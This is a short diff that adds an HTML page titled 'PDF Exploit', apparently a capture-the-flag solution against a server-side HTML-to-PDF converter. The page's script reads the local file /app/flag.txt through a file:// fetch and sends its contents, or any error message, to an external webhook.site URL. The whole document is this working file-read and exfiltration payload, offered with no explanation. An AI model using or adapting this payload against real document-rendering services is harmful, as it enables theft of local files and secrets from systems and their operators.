@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PDF Exploit</title>
+</head>
+<body>
+    <script>
+        fetch('file:///app/flag.txt')
+            .then(response => response.text())
+            .then(data => {
+                fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?data=' + encodeURIComponent(data));
+            })
+            .catch(error => {
+                fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?error=' + encodeURIComponent(error));
+            });
+    </script>
+</body>
+</html>
